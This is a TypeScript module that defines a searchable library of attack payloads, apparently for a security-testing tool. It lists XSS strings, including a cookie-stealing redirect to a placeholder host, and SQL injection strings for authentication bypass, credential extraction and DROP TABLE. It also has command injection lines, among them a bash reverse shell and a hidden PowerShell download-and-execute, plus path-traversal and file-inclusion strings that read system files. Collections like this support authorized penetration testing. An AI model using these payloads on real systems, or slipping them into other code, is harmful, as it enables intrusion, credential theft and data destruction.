

interface Payload {
  name: string;
  value: string;
  description: string;
  tags?: string[];
}

interface PayloadCategory {
  name: string;
  description: string;
  payloads: Payload[];
}


export const xssPayloads: PayloadCategory = {
  name: 'XSS',
  description: 'Cross-Site Scripting attack payloads',
  payloads: [
    {
      name: 'Basic Alert',
      value: '<script>alert("XSS")</script>',
      description: 'Basic JavaScript alert execution',
      tags: ['basic', 'alert']
    },
    {
      name: 'Image Onerror',
      value: '<img src="x" onerror="alert(\'XSS\')">',
      description: 'XSS via image error event',
      tags: ['bypass', 'img']
    },
    {
      name: 'SVG Onload',
      value: '<svg onload="alert(\'XSS\')">',
      description: 'SVG element with onload event handler',
      tags: ['bypass', 'svg']
    },
    {
      name: 'JavaScript URI',
      value: 'javascript:alert("XSS")',
      description: 'JavaScript URI protocol handler',
      tags: ['uri', 'link']
    },
    {
      name: 'Encoded Script Tags',
      value: '&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;',
      description: 'HTML entity encoded script tag',
      tags: ['encoded', 'evasion']
    },
    {
      name: 'DOM XSS',
      value: '"><script>document.location=\'https://local.fakeapi/steal?c=\'+document.cookie</script>',
      description: 'Example for cookie stealing via redirection',
      tags: ['dom', 'cookie']
    },
    {
      name: 'Event Handlers',
      value: '<body onload="alert(\'XSS\')">',
      description: 'Body tag with onload event handler',
      tags: ['event', 'body']
    },
    {
      name: 'CSS Injection',
      value: '<div style="background-image: url(javascript:alert(\'XSS\'))">',
      description: 'CSS with JavaScript URI injection',
      tags: ['css', 'style']
    }
  ]
};


export const sqlInjectionPayloads: PayloadCategory = {
  name: 'SQL Injection',
  description: 'SQL Injection attack payloads',
  payloads: [
    {
      name: 'Basic Authentication Bypass',
      value: '\' OR \'1\'=\'1',
      description: 'Basic SQL authentication bypass',
      tags: ['auth', 'bypass']
    },
    {
      name: 'Table Drop',
      value: '1; DROP TABLE users--',
      description: 'SQL injection to drop a table',
      tags: ['destructive', 'table']
    },
    {
      name: 'Union Select',
      value: '\' UNION SELECT username,password FROM users--',
      description: 'UNION query to extract data',
      tags: ['union', 'extract']
    },
    {
      name: 'Admin Bypass',
      value: 'admin\'--',
      description: 'Comment out remaining SQL query',
      tags: ['auth', 'bypass']
    },
    {
      name: 'Blind Boolean',
      value: '\' AND 1=1--',
      description: 'Blind SQL injection testing boolean condition',
      tags: ['blind', 'boolean']
    },
    {
      name: 'Time Delay',
      value: '\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ',
      description: 'Time-based SQL injection using SLEEP function',
      tags: ['time', 'blind']
    },
    {
      name: 'Error Based',
      value: '\' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))-- ',
      description: 'Error-based SQL injection using EXTRACTVALUE',
      tags: ['error', 'extract']
    },
    {
      name: 'Out-of-Band',
      value: '\' UNION ALL SELECT NULL,CONCAT(0x716d707a71,IFNULL(CAST(current_user() AS CHAR),0x20),0x716d707a71)# ',
      description: 'Out-of-band SQL injection payload',
      tags: ['oob', 'exfiltration']
    }
  ]
};


export const commandInjectionPayloads: PayloadCategory = {
  name: 'Command Injection',
  description: 'Command/OS Injection attack payloads',
  payloads: [
    {
      name: 'Windows Command',
      value: '& whoami',
      description: 'Windows command chaining using &',
      tags: ['windows', 'basic']
    },
    {
      name: 'Linux Pipe',
      value: '| cat /etc/passwd',
      description: 'Linux command piping',
      tags: ['linux', 'pipe']
    },
    {
      name: 'Bash Command Substitution',
      value: '$(cat /etc/passwd)',
      description: 'Bash command substitution',
      tags: ['bash', 'substitution']
    },
    {
      name: 'Backtick Execution',
      value: '`id`',
      description: 'Command execution with backticks',
      tags: ['backtick', 'basic']
    },
    {
      name: 'Semicolon Separator',
      value: '; ls -la',
      description: 'Command separation with semicolon',
      tags: ['separator', 'basic']
    },
    {
      name: 'New Line Bypass',
      value: '\\n cat /etc/passwd',
      description: 'New line character to bypass filters',
      tags: ['bypass', 'newline']
    },
    {
      name: 'Reverse Shell',
      value: '| bash -i >& /dev/tcp/local.fakeapi/8080 0>&1',
      description: 'Simple reverse shell payload',
      tags: ['shell', 'reverse']
    },
    {
      name: 'Windows PowerShell',
      value: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object System.Net.WebClient).DownloadString(\'https://local.fakeapi/script.ps1\')"',
      description: 'PowerShell download and execute',
      tags: ['powershell', 'download']
    }
  ]
};


export const fileInclusionPayloads: PayloadCategory = {
  name: 'File Inclusion',
  description: 'Local and Remote File Inclusion payloads',
  payloads: [
    {
      name: 'Basic Path Traversal',
      value: '../../../etc/passwd',
      description: 'Basic directory traversal',
      tags: ['lfi', 'basic']
    },
    {
      name: 'Deep Path Traversal',
      value: '../../../../../../../../etc/passwd',
      description: 'Deep path traversal with multiple traversals',
      tags: ['lfi', 'deep']
    },
    {
      name: 'PHP Filter',
      value: 'php://filter/convert.base64-encode/resource=index.php',
      description: 'PHP filter wrapper to read source code',
      tags: ['php', 'filter']
    },
    {
      name: 'Proc Self',
      value: '/proc/self/environ',
      description: 'Access server environment variables in Linux',
      tags: ['proc', 'linux']
    },
    {
      name: 'Remote File Inclusion',
      value: 'https://local.fakeapi/malicious.php',
      description: 'RFI using an external URL',
      tags: ['rfi', 'url']
    },
    {
      name: 'Null Byte',
      value: '../../../etc/passwd%00',
      description: 'Using null byte to bypass extension checks',
      tags: ['nullbyte', 'bypass']
    },
    {
      name: 'Windows System Files',
      value: '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      description: 'Windows hosts file access',
      tags: ['windows', 'system']
    },
    {
      name: 'Double Encoding',
      value: '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
      description: 'Double URL encoding to bypass filters',
      tags: ['encoded', 'bypass']
    }
  ]
};


export const getAllPayloads = (): PayloadCategory[] => {
  return [
    xssPayloads,
    sqlInjectionPayloads,
    commandInjectionPayloads,
    fileInclusionPayloads
  ];
};


export const searchPayloads = (query: string): Payload[] => {
  const allPayloads: Payload[] = getAllPayloads().flatMap(category => category.payloads);
  
  if (!query) return allPayloads;
  
  const normalizedQuery = query.toLowerCase();
  
  return allPayloads.filter(payload => 
    payload.name.toLowerCase().includes(normalizedQuery) ||
    payload.description.toLowerCase().includes(normalizedQuery) ||
    payload.value.toLowerCase().includes(normalizedQuery) ||
    payload.tags?.some(tag => tag.toLowerCase().includes(normalizedQuery))
  );
};
